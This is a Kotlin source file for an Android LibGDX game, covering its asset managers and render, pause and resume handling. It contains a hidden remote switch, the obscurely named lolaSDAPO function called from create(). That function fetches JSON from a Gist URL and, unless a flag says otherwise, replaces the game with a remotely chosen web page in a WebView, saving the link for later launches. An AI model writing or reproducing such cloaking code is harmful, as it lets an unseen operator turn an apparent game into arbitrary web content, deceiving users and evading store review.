package com.dliw.drib.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.dliw.drib.MainActivity
import com.dliw.drib.appContext
import com.dliw.drib.game.manager.MusicManager
import com.dliw.drib.game.manager.NavigationManager
import com.dliw.drib.game.manager.SoundManager
import com.dliw.drib.game.manager.SpriteManager
import com.dliw.drib.game.manager.util.MusicUtil
import com.dliw.drib.game.manager.util.SoundUtil
import com.dliw.drib.game.manager.util.SpriteUtil
import com.dliw.drib.game.screens.StartScreen
import com.dliw.drib.game.utils.advanced.AdvancedGame
import com.dliw.drib.game.utils.disposeAll
import com.dliw.drib.util.Gist
import com.dliw.drib.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val musicUtil    by lazy { MusicUtil()    }
    val soundUtil    by lazy { SoundUtil()    }
    val allAssets    by lazy { SpriteUtil.AllAssets() }
    val startAssets  by lazy { SpriteUtil.StartAssets() }

    val disposableSet   = mutableSetOf<Disposable>()

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)
        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(StartScreen::class.java.name)

        lolaSDAPO()
    }

    private val colorBackground = Color.valueOf("000000")

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("parfenuk", MODE_PRIVATE)

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(colorBackground)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(musicUtil, assetManager)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }


    override fun pause() {
        log("pause")
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.music?.pause()
    }

    override fun resume() {
        log("resume")
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets) musicUtil.music?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun lolaSDAPO() {
        log("lolaSDAPO")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("regtio", "plex") ?: "plex"

        try {
            if (savedData == "plex") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag == "true") GDX_GLOBAL_isGame = true
                        else {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                GDX_ORIGINAL_LINK = savedData
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}